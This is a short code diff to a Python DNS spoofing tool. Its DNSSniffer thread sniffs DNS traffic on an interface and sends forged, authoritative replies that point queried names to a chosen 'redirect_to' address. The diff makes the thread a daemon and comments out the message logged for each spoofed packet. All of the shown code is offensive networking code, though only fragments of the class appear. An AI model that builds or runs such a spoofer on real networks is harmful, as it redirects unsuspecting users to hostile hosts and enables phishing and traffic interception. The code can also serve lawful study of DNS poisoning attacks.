@@ -7,6 +7,7 @@ class DNSSniffer(threading.Thread):
   def __init__(self, rIp, interface): 
     threading.Thread.__init__(self) 
     self.e = threading.Event() 
+    self.daemon = True
     self.rIp = rIp 
     self.interface = interface 
     self.kill_received = False 
@@ -29,7 +30,7 @@ class DNSSniffer(threading.Thread):
           DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
           an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
       send(spoofed_pkt,verbose=0)
-      print 'Sent spoofed packet'
+      #print 'Sent spoofed packet', spoofed_pkt  
 
   def sniff(self):
     sniff(iface = self.interface, filter = 'port 53', prn = self.cb, stop_filter=lambda p: self.e.is_set()) 
